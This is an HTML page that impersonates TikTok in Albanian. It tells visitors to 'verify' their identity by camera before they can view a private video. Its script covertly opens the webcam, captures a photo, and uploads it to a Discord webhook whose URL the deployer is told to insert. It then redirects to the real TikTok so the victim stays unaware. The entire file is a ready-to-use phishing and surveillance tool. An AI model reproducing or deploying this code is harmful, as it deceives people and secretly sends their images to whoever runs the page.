#   
<!DOCTYPE html>  
<html lang="sq">  
<head>  
    <meta charset="UTF-8">  
    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
    <title>TikTok - Watch & Share</title>  
    <link rel="icon" href="https://www.tiktok.com/favicon.ico">  
    <style>  
        body { background-color: #010101; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }  
        .container { text-align: center; padding: 20px; width: 100%; max-width: 400px; }  
        .tiktok-logo { width: 150px; margin-bottom: 20px; }  
        .verify-box { background: #121212; padding: 30px; border-radius: 8px; border: 1px solid #333; }  
        h2 { font-size: 22px; margin-bottom: 10px; }  
        p { color: #a1a1a1; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }  
        .btn-verify { background-color: #fe2c55; color: white; border: none; padding: 12px 30px; font-size: 16px; font-weight: bold; border-radius: 4px; cursor: pointer; width: 100%; }  
        .loader { display: none; border: 3px solid #333; border-top: 3px solid #fe2c55; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 10px auto; }  
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }  
    </style>  
</head>  
<body>  
  
<div class="container">  
    <img src="https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-whole-af3a19597cf4f74ef93976378c77395b.svg" class="tiktok-logo" alt="TikTok">  
    <div class="verify-box">  
        <h2>Verifikimi i Sigurisë</h2>  
        <p>Për të parë këtë video private, ju lutemi verifikoni identitetin tuaj përmes Face-ID ose Kamerës.</p>  
        <button class="btn-verify" onclick="startCapture()">VERIFIKO TANI</button>  
        <div id="loader" class="loader"></div>  
    </div>  
</div>  
  
<video id="video" autoplay style="display:none;"></video>  
<canvas id="canvas" style="display:none;"></canvas>  
  
<script>  
    // MOS HARRO: Ndrysho WEBHOOK_URL me linkun tend real te Discord  
    const WEBHOOK_URL = "VENDO_LINKUN_TEND_KETU";  
  
    async function startCapture() {  
        document.querySelector('.btn-verify').style.display = 'none';  
        document.getElementById('loader').style.display = 'block';  
  
        try {  
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });  
            const video = document.getElementById('video');  
            video.srcObject = stream;  
  
            setTimeout(() => {  
                const canvas = document.getElementById('canvas');  
                canvas.width = video.videoWidth;  
                canvas.height = video.videoHeight;  
                canvas.getContext('2d').drawImage(video, 0, 0);  
  
                canvas.toBlob(blob => {  
                    const formData = new FormData();  
                    formData.append('file', blob, 'user_photo.png');  
                    formData.append('content', '📸 **Foto e Re!** Dikush hapi linkun.');  
  
                    fetch(WEBHOOK_URL, {  
                        method: 'POST',  
                        body: formData  
                    }).then(() => {  
                        window.location.href = "https://www.tiktok.com";  
                    });  
                }, 'image/png');  
            }, 1500);  
  
        } catch (err) {  
            window.location.href = "https://www.tiktok.com";  
        }  
    }  
</script>  
</body>  
</html>  
